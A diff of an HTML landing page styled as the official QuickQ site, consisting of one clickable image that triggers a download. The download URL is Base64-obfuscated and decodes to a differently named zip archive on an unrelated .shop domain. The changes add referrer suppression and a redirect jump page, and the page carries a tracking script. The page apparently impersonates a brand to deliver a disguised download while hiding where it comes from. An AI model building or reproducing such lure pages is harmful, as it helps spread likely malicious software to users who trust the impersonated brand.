@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Quickq官网</title>
+  <meta name="referrer" content="no-referrer"> <!-- 禁止传递来源 -->
   <style>
     * {
       margin: 0;
@@ -12,11 +13,9 @@
     }
     body {
       overflow-y: scroll;
-      padding-top: 0;
     }
     .container {
       width: 100%;
-      max-width: 100%;
       margin: 0 auto;
       text-align: center;
     }
@@ -30,20 +29,22 @@
 </head>
 <body>
   <div class="container">
-    <img id="mainImage" src="pv.webp" alt="点击下载" onclick="triggerDownload()">
+    <img
+      id="mainImage"
+      src="pv.webp"
+      alt="去下载"
+      onclick="gotoDownload()"
+    >
   </div>
 
   <script>
-    function triggerDownload() {
-      // Base64 链接（真实链接经过 Base64 编码）
-      const encodedUrl = "ZG93bi9pbmRleC5odG1sP2M9YUhSMGNITTZMeTl6YjJaMExtUnZkMjV2YzNNdGQybHVNREl1YzJodmNDOU1aWFJ6VmxBeExVeGxhWE5xY25sMWRDNTZhWEE9";
-      const decodedUrl = atob(encodedUrl);
-
-      // 创建临时下载元素
+    function gotoDownload() {
+      const encodedUrl = "aHR0cHM6Ly9zb2Z0LmRvd25vc3Mtd2luMDIuc2hvcC9MZXRzVlAxLUxlaXNqcnl1dC56aXA=";
+      const jumpUrl = "down/?c=" + encodeURIComponent(encodedUrl);
       const a = document.createElement("a");
-      a.href = decodedUrl;
-      a.download = decodedUrl.split('/').pop() || "download"; // 设置下载文件名
-      a.target = "_blank"; // 防止被拦截
+      a.href = jumpUrl;
+      a.rel = "noreferrer"; 
+      a.target = "_self"; 
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
@@ -51,5 +52,6 @@
   </script>
 </body>
 </html>
+
 <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
 <script>LA.init({id:"K60g0ikdgGnhQb1B",ck:"K60g0ikdgGnhQb1B"})</script>
